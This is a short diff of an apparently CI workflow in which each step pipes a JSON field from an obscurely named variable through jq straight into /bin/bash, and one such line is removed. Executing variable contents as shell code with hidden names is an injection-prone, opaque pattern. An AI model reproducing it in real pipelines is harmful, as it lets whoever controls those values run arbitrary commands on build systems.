@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$lxgue0902" | jq -r .dw811 | /bin/bash
           printf '%s' "$qk2618" | jq -r .ufgbw7999 | /bin/bash
           printf '%s' "$dy414" | jq -r .p1547 | /bin/bash
-          echo $orqh0640 | jq -r .hel7 | /bin/bash
           printf '%s' "$doian88787" | jq -r .xouxw15 | /bin/bash
 
       - name: Archive results
